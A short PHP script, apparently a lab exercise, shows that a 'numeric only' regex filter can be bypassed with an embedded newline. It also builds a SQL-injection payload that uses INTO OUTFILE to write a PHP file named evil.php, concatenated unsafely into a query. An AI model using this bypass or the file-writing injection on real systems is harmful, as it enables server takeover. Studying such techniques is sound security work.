<?php

// $quantity = "123";       // Bypassed (numeric only)
// $quantity = "123asd";    // Filtered (non-numeric detected)
$quantity = "123\nasd";     // Bypassed (non-numeric undetected)

// regex to only accept numeric
if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)){
    echo "Filtered\n";
} else {
    echo "Bypassed\n";
}

// examining sqli payload
$product_id = "';select '<?php phpinfo();?>' into outfile '/var/lib/mysql/evil.php' #1";
$sql = "SELECT * FROM products WHERE id = '" . $product_id . "'";

echo $sql;